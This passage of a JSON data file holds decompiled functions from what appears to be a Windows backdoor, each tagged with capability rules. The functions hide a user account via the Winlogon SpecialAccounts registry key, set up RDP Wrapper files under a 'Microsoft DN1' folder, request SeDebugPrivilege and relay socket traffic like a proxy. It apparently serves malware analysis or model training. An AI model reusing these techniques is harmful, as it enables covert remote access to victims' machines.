        "decompiled_code": "\nuint __cdecl fcn.0008b3f2(int32_t buf)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = buf;\n    if (buf == 0) {\ncode_r0x0008b428:\n        uVar2 = 0;\n    }\n    else {\n        do {\n            iVar1 = (*_sym.imp.WS2_32.dll_send)(in_ECX, (in_EDX - iVar3) + buf, iVar3, 0);\n            if (iVar1 == -1) goto code_r0x0008b428;\n            iVar3 = iVar3 - iVar1;\n        } while (iVar3 != 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "0008b4b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0008b511)\n\nvoid __cdecl fcn.0008b4b1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t lpParameter;\n    uint hObject;\n    uint var_4h;\n    \n    *0x97bec = arg_8h;\n    lpParameter = fcn.00085955();\n    fcn.00082eeb(&arg_14h);\n    *(lpParameter + 4) = 0xd3d;\n    fcn.00082eeb(&arg_ch);\n    *(lpParameter + 0xc) = arg_10h;\n    *(lpParameter + 0x10) = 0x97818;\n    fcn.00081e8e(fcn.0008b3df, lpParameter);\n    fcn.000858fb();\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 208
    },
    "0008bba0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008bba0(int32_t param_1)\n\n{\n    int32_t lpString2_00;\n    bool bVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint lpString1;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    bVar1 = false;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n    if (iVar2 != 0) {\n        lpString2_00 = param_1 + 0x28;\n        var_24h = 1;\n        do {\n            var_ch = 0;\n            (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)(iVar2, 0, 0x30, 3, 0, 0, &var_10h, &var_4h, &var_ch, 0);\n            uVar5 = var_10h;\n            piVar3 = fcn.00085955();\n            iVar4 = (*_sym.imp.ADVAPI32.dll_EnumServicesStatusExW)\n                              (iVar2, 0, 0x30, 3, piVar3, uVar5, &var_10h, &var_4h, &var_ch, 0);\n            if ((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0xea)) break;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            uVar7 = 0;\n            piVar6 = piVar3;\n            if (var_4h == 0) break;\n            while( true ) {\n                if (*piVar6 == 0) goto code_r0x0008bc81;\n                fcn.000833ab(*piVar6);\n                iVar2 = fcn.0008300e(lpString2_00);\n                if (iVar2 != 0) break;\n                fcn.000858fb();\n                lpString1 = 0;\n                uVar7 = uVar7 + 1;\n                piVar6 = piVar6 + 0xb;\n                if (var_4h <= uVar7) goto code_r0x0008bc81;\n            }\n            uVar5 = fcn.000833ab(piVar3[uVar7 * 0xb]);\n            fcn.000831fd(uVar5);\n            fcn.000858fb();\n            *(param_1 + 0x2c) = piVar3[uVar7 * 0xb + 9];\n            fcn.000858fb();\n            lpString1 = 0;\n            if (*(param_1 + 0x2c) != 0) {\n                uVar8 = 0;\n                uVar7 = var_4h;\n                if (var_4h == 0) goto code_r0x0008bc85;\n                goto code_r0x0008bd22;\n            }\n            if (bVar1) break;\n            fcn.0008b5e1(lpString2_00, 2);\n            fcn.0008b64d(lpString2_00);\n            bVar1 = true;\n            fcn.000810c1(piVar3);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 5);\n        } while (iVar2 != 0);\n    }\ncode_r0x0008bc81:\n    var_24h = 0;\n    goto code_r0x0008bc85;\n    while( true ) {\n        if (piVar3[9] == *(param_1 + 0x2c)) {\n            fcn.000833ab(*piVar3);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(lpString1, 0);\n            if (iVar2 != 0) {\n                iVar2 = *piVar3;\n                fcn.000833ab(iVar2);\n                fcn.00082100(iVar2);\n            }\n            fcn.000858fb();\n            uVar7 = var_4h;\n        }\n        lpString1 = 0;\n        uVar8 = uVar8 + 1;\n        piVar3 = piVar3 + 0xb;\n        if (uVar7 <= uVar8) break;\ncode_r0x0008bd22:\n        lpString1 = 0;\n        if (*piVar3 == 0) break;\n    }\ncode_r0x0008bc85:\n    fcn.000858fb();\n    return var_24h;\n}\n",
        "token_count": 1132
    },
    "0008c017": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008c017(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    uint in_stack_ffffff9c;\n    uint uVar6;\n    uint *puVar7;\n    int32_t arg_ch;\n    uint uStack84;\n    uint uStack80;\n    int32_t iStack76;\n    \n    uVar2 = 0;\n    uStack80 = 0x8c03a;\n    iStack76 = param_1;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uStack80 = 0x8c03f;\n    iVar1 = fcn.0008d780();\n    if (iVar1 == 1) {\n        uStack80 = 0x8c04d;\n        fcn.0008d39c();\n    }\n    puVar7 = param_1 + 0x38;\n    uStack80 = *puVar7;\n    uStack84 = 0x8c058;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n    if (iVar1 == 0) {\n        uStack84 = 0;\n        uVar6 = extraout_ECX;\n        fcn.000833f3(puVar7);\n        fcn.0008dd2b(puVar7, uVar6);\n        iVar1 = fcn.0008d780();\n        if (iVar1 == 1) {\n            uVar6 = 2;\n        }\n        else {\n            uVar6 = 1;\n        }\n        in_stack_ffffff9c = *(param_1 + 0x60);\n        uVar6 = fcn.00090ce2(&stack0xffffffb4, in_stack_ffffff9c, uVar6);\n        fcn.00082c65(uVar6);\n        fcn.00082dff();\n        if (iStack76 != 0) {\n            iVar1 = fcn.0008d918(extraout_ECX_00, extraout_ECX_00);\n            if (iVar1 != 0) {\n                puVar5 = &stack0xffffffac;\n                uVar6 = extraout_ECX_01;\n                fcn.0008dc65(puVar5);\n                fcn.0008dc4d(puVar5, uVar6);\n            }\n            uStack84 = 0x8c0ed;\n            fcn.0008da15();\n            goto code_r0x0008c0ed;\n        }\ncode_r0x0008c0ac:\n        fcn.0008da15();\n        uVar2 = 0xffffffff;\n    }\n    else {\ncode_r0x0008c0ed:\n        puVar7 = param_1 + 0x3c;\n        uStack84 = *puVar7;\n        iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n        if (iVar1 == 0) {\n            iVar1 = extraout_ECX_02;\n            fcn.000833f3(puVar7);\n            fcn.0008dd2b(puVar7, iVar1);\n            in_stack_ffffff9c = 3;\n            fcn.00090ce2(&stack0xffffffb0, *(param_1 + 0x60), 3);\n            if (iVar1 == 0) {\n                fcn.00082dff();\n                goto code_r0x0008c0ac;\n            }\n            iVar1 = fcn.0008d918(extraout_ECX_03, extraout_ECX_03);\n            if (iVar1 != 0) {\n                puVar5 = &stack0xffffff9c;\n                uVar6 = extraout_ECX_04;\n                fcn.0008dc65(puVar5);\n                fcn.0008dc4d(puVar5, uVar6);\n            }\n            fcn.00082dff();\n            fcn.0008da15();\n        }\n        fcn.0008bdf7();\n        fcn.0008bdde();\n        iVar1 = fcn.0008bba0();\n        if (iVar1 == 0) {\n            fcn.0008d375();\n            iVar1 = param_1 + 0x58;\n            arg_ch = 4;\n        }\n        else {\n            iVar1 = fcn.0008bafb();\n            if (iVar1 == 0) {\n                fcn.0008d375();\n                iVar1 = param_1 + 0x5c;\n                arg_ch = param_1 + 0x58;\n                in_stack_ffffff9c = 6;\n            }\n            else {\n                fcn.0008bd7b();\n                fcn.000833ab(L\"SeDebugPrivilege\");\n                (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                iVar1 = fcn.0008d3ca();\n                fcn.000858fb();\n                if (iVar1 == 0) {\n                    fcn.0008d375();\n                    iVar1 = param_1 + 0x5c;\n                    arg_ch = param_1 + 0x58;\n                    in_stack_ffffff9c = 3;\n                }\n                else {\n                    iVar1 = fcn.0008e7e1();\n                    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n                    if (iVar1 == 0) {\n                        fcn.0008d375();\n                        iVar1 = param_1 + 0x5c;\n                        arg_ch = param_1 + 0x58;\n                        in_stack_ffffff9c = 5;\n                    }\n                    else {\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                        if (*(param_1 + 0x48) != 0) {\n                            uVar3 = 0;\n                            do {\n                                fcn.000856f9();\n                                fcn.000833f3(*(param_1 + 0x40) + uVar3 * 4);\n                                fcn.0008b64d(&stack0xffffffb0);\n                                fcn.000858fb();\n                                uVar3 = uVar3 + 1;\n                                uStack84 = 0;\n                                pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n                            } while (uVar3 < *(param_1 + 0x48));\n                        }\n                        (*pcVar4)();\n                        fcn.000833f3(param_1 + 0x28);\n                        fcn.0008b64d(&stack0xffffffac);\n                        fcn.000858fb();\n                        (*pcVar4)(500);\n                        iVar1 = fcn.0008b780();\n                        if (iVar1 != 0) {\n                            iVar1 = fcn.0008d780();\n                            if (iVar1 == 1) {\n                                fcn.0008d375();\n                            }\n                            uVar2 = fcn.000846da(0, param_1 + 0x58, param_1 + 0x5c);\n                            fcn.00084a3d(uVar2);\n                            fcn.000846b7();\n                            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n                            uVar2 = 8;\n                            goto code_r0x0008c32e;\n                        }\n                        iVar1 = param_1 + 0x5c;\n                        arg_ch = param_1 + 0x58;\n                        in_stack_ffffff9c = 7;\n                    }\n                }\n            }\n        }\n        uVar6 = fcn.000846da(in_stack_ffffff9c, arg_ch, iVar1);\n        fcn.00084a3d(uVar6);\n        fcn.000846b7();\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n    }\ncode_r0x0008c32e:\n    fcn.00082dff();\n    return uVar2;\n}\n",
        "token_count": 1797
    },
    "0008c442": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008c442(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint uVar6;\n    char16_t *pcVar7;\n    uint lpCriticalSection;\n    uint var_20h;\n    uint var_10h;\n    uint lpData;\n    uint hKey;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar4 = &lpCriticalSection;\n    puVar5 = 0x97cc8;\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x97cc8);\n    *0x97d28 = arg_8h;\n    *0x97d1c = 0x96cd0;\n    *0x97d18 = arg_ch;\n    iVar3 = fcn.0008bf64();\n    if (iVar3 == 0) {\n        uVar2 = fcn.0008d279();\n        if ((uVar2 < 6) || (iVar3 = fcn.0008d22a(),  iVar3 != 0)) {\n            uVar1 = fcn.000846da(2, 0x97d20, 0x97d24);\n            fcn.00084a3d(uVar1);\n            fcn.000846b7();\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x97cc8);\n            return 0;\n        }\n        iVar3 = fcn.0008d724();\n        if (iVar3 == 1) {\n            uVar1 = fcn.0008326d();\n            fcn.000831fd(uVar1);\n            fcn.000858fb();\n            uVar1 = fcn.0008326d();\n            fcn.000831fd(uVar1);\n            fcn.000858fb();\n            uVar1 = 0;\n            (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                      (0x80000002, \n                       \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\", 0, 0, 0, \n                       0xf013f, 0, &hKey, &var_10h);\n            lpData = 0;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *0x97d20, 0, 4, &lpData, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            iVar3 = fcn.0008b55d(0x97d20, 0x97d24);\n            if (iVar3 != 0) {\n                uVar6 = 0x97d20;\n                pcVar7 = L\"rudp\";\n                uVar1 = fcn.000833ab(L\"rudp\");\n                fcn.0008ef5f(uVar1, pcVar7);\n                fcn.000858fb(uVar1, pcVar7, uVar6);\n                uVar6 = 0x97d24;\n                pcVar7 = L\"rpdp\";\n                uVar1 = fcn.000833ab(L\"rpdp\");\n                fcn.0008ef5f(uVar1, pcVar7);\n                fcn.000858fb(uVar1, pcVar7, uVar6);\n                fcn.00081e8e(fcn.0008c340, 0x97cc8);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x97cc8);\n                return 1;\n            }\n            uVar6 = fcn.000846da(9, 0x97d20, 0x97d24);\n            fcn.00084a3d(uVar6);\n            fcn.000846b7();\n        }\n        else {\n            uVar1 = fcn.000846da(1, 0x97d20, 0x97d24);\n            fcn.00084a3d(uVar1);\n            fcn.000846b7();\n            uVar1 = 0;\n        }\n    }\n    else {\n        uVar1 = fcn.000833ab(L\"rudp\");\n        uVar1 = fcn.0008ef92(&arg_ch, uVar1);\n        fcn.000831fd(uVar1);\n        fcn.000858fb();\n        arg_ch = 0;\n        fcn.000858fb();\n        uVar1 = fcn.000833ab(L\"rpdp\");\n        uVar1 = fcn.0008ef92(&arg_ch, uVar1);\n        fcn.000831fd(uVar1);\n        fcn.000858fb();\n        arg_ch = 0;\n        fcn.000858fb();\n        iVar3 = fcn.00083027();\n        if ((iVar3 == 0) && (iVar3 = fcn.00083027(),  iVar3 == 0)) {\n            fcn.000833ab(0x92428);\n            uVar6 = 0x92428;\n            uVar1 = fcn.000833ab(0x92428);\n            uVar1 = fcn.000846da(8, uVar1, uVar6);\n            fcn.00084a3d(uVar1);\n            fcn.000846b7();\n            fcn.000858fb();\n            arg_ch = 0;\n            fcn.000858fb();\n        }\n        else {\n            uVar1 = fcn.000846da(8, 0x97d20, 0x97d24);\n            fcn.00084a3d(uVar1);\n            fcn.000846b7();\n        }\n        uVar1 = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x97cc8);\n    return uVar1;\n}\n",
        "token_count": 1387
    },
    "0008c74b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0008c74b(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x97cc8);\n    *0x97d14 = 5;\n    *0x97d0c = 5;\n    *0x97ce0 = ZEXT816(0);\n    *0x97cf0 = 0;\n    *0x97cf8 = ZEXT816(0);\n    *0x97d10 = 0;\n    puVar1 = fcn.000859a9();\n    if (puVar1 == NULL) {\n        *0x97d08 = NULL;\n    }\n    else {\n        *puVar1 = 5;\n        *0x97d08 = puVar1 + 1;\n        **0x97d08 = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n    }\n    *0x97d20 = 0;\n    *0x97d24 = 0;\n    fcn.000830c5(L\"TermService\");\n    fcn.000830c5(L\"%ProgramFiles%\");\n    iVar2 = fcn.0008d780();\n    if (iVar2 == 1) {\n        fcn.000830c5(L\"%ProgramW6432%\");\n        uVar3 = fcn.00082f9a();\n        fcn.000831fd(uVar3);\n        fcn.000858fb();\n        fcn.000830c5(L\"%ProgramFiles%\");\n    }\n    else {\n        uVar3 = fcn.00082f9a();\n        fcn.000831fd(uVar3);\n        fcn.000858fb();\n    }\n    fcn.00083230(L\"\\\\Microsoft DN1\");\n    fcn.00083230(L\"\\\\Microsoft DN1\");\n    fcn.0008d4d0();\n    fcn.000831fd(0x97d00);\n    fcn.00083230(L\"\\\\rdpwrap.ini\");\n    fcn.00083230(L\"\\\\sqlmap.dll\");\n    fcn.00083230(L\"\\\\sqlmap.dll\");\n    return 0x97cc8;\n}\n",
        "token_count": 529
    },
    "0008c927": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0008c927(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack16 = *(arg_8h + 4);\n    uStack12 = *(arg_8h + 0x10);\n    do {\n        iVar1 = fcn.0008c993();\n        if (iVar1 < 1) goto code_r0x0008c982;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack16, 0, *(arg_8h + 0x1c));\n        if (iVar1 == 0) {\n            iVar1 = fcn.0008c993();\n            if (0 < iVar1) {\n                iVar1 = 0;\n            }\n            goto code_r0x0008c982;\n        }\n    } while (iVar1 != 1);\n    iVar1 = 1;\ncode_r0x0008c982:\n    fcn.0008ca7e();\n    return iVar1;\n}\n",
        "token_count": 241
    },
    "0008ca7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008ca7e(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = param_1 + 0x14;\n    if (*piVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != *(param_1 + 0x18)) {\n            if (*(param_1 + 0x10) == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*(param_1 + 0x10));\n            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*piVar1, 5000);\n            if (iVar2 == 0x102) {\n                (*_sym.imp.KERNEL32.dll_TerminateThread)(*piVar1, 0xfffffffe);\n            }\n        }\n        fcn.0008cc81();\n    }\n    fcn.0008cc81();\n    fcn.0008cc81();\n    fcn.0008cc81();\n    fcn.0008cc81();\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 270
    },
    "0008cc81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008cc81(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 62
    },
    "0008ccc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008ccc5(uint arg_8h)\n\n{\n    uint in_ECX;\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x96584 == 0) {\n        uVar1 = 0;\n        var_4h = in_ECX;\n    }\n    else {\n        fcn.00082f25();\n        var_4h = 0;\n        uVar1 = fcn.00082e52(&var_4h, 0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(*0x96584, arg_8h, uVar1);\n    }\n    fcn.000858fb();\n    return uVar1;\n}\n",
        "token_count": 159
    },
    "0008ceb6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0008cfd5)\n// WARNING: Removing unreachable block (ram,0x0008cfe9)\n// WARNING: Removing unreachable block (ram,0x0008cff6)\n// WARNING: Removing unreachable block (ram,0x0008d005)\n// WARNING: Removing unreachable block (ram,0x0008cff8)\n\nuint __cdecl fcn.0008ceb6(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puStack348;\n    uint uStack344;\n    uint32_t uStack340;\n    uint32_t uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint32_t uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar auStack289 [285];\n    \n    auStack289[0] = 0;\n    uStack308 = 0x8cede;\n    uVar2 = fcn.0008d105();\n    pcVar1 = _sym.imp.WS2_32.dll_recv;\n    if (uVar2 != 0xffffffff) {\n        uStack308 = 0;\n        puStack316 = &stack0xfffffedf;\n        uStack312 = 1;\n        uStack324 = 0x8cefa;\n        uStack320 = uVar2;\n        iVar3 = (*_sym.imp.WS2_32.dll_recv)();\n        if (0 < iVar3) {\n            puStack332 = &stack0xfffffece;\n            uStack324 = 0;\n            uStack328 = 1;\n            uStack340 = 0x8cf0f;\n            uStack336 = uVar2;\n            iVar3 = (*pcVar1)();\n            if (0 < iVar3) {\n                uStack340 = 0;\n                uStack344 = 2;\n                puStack348 = &stack0xfffffec0;\n                uVar4 = uVar2;\n                iVar3 = (*pcVar1)(uVar2);\n                if (0 < iVar3) {\n                    uStack340 = (*_sym.imp.WS2_32.dll_ntohs)(uStack336);\n                    uStack340 = uStack340 & 0xffff;\n                    iVar3 = (*pcVar1)(uVar2, &stack0xfffffeb0, 4);\n                    if (0 < iVar3) {\n                        puStack348 = NULL;\n                        uStack344 = 0;\n                        uStack340 = 0;\n                        uStack336 = 0;\n                        fcn.00081052(&stack0xfffffeb4, 0, 0xff);\n                        (*_sym.imp.USER32.dll_wsprintfA)\n                                  (&stack0xfffffea4, \"%u.%u.%u.%u\", uVar4 & 0xff, uVar4 >> 8 & 0xff, \n                                   uVar4 >> 0x10 & 0xff, uVar4 >> 0x18);\n                        uVar4 = 0;\n                        do {\n                            iVar3 = (*pcVar1)(uVar2, &stack0xfffffeb4, 0xff, 0);\n                            if (iVar3 < 1) {\n                                return 0;\n                            }\n                            if ((&stack0xfffffeb4)[uVar4] == '\\0') {\n                                fcn.0008d01d();\n                                return 0;\n                            }\n                            uVar4 = uVar4 + 1;\n                        } while (uVar4 < 0xff);\n                    }\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 801
    },
    "0008d07e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d07e(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint buf;\n    int32_t argp;\n    \n    argp = 0;\n    iVar1 = (*_sym.imp.WS2_32.dll_ioctlsocket)(param_1, 0x4004667f, &argp);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    if (argp == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1);\n    }\n    else {\n        fcn.00081052(&buf, 0, 0x800);\n        argp = (*_sym.imp.WS2_32.dll_recv)(param_1, &buf, 0x800, 0);\n        if (argp == 0) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.WS2_32.dll_send)(param_2, &buf, argp, 0);\n        if (iVar1 < 1) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 248
    },
    "0008d22a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0008d22a(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x94290);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if ((var_2h != '\\x02') && (var_2h != '\\x03')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 204
    },
    "0008d279": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0008d279(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_10ch;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x94290);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch != 2) {\n        return 0;\n    }\n    return var_118h;\n}\n",
        "token_count": 176
    },
    "0008d4e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d4e2(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t hKey;\n    \n    hKey = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, *param_2, 0, 0x20019, &hKey);\n    if (iVar1 == 2) {\n        return 0;\n    }\n    if (hKey != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return 1;\n}\n",
        "token_count": 140
    },
    "0008d56a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0008d56a(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    int32_t var_118h;\n    int32_t var_114h;\n    int32_t var_10ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x94290);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch == 2) {\n        if (var_2h == '\\x01') {\n            if (var_118h == 5) {\n                if (var_114h == 0) {\n                    return var_8h + 500;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x1fe;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x208;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 600;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x262;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x26c;\n                }\n                if 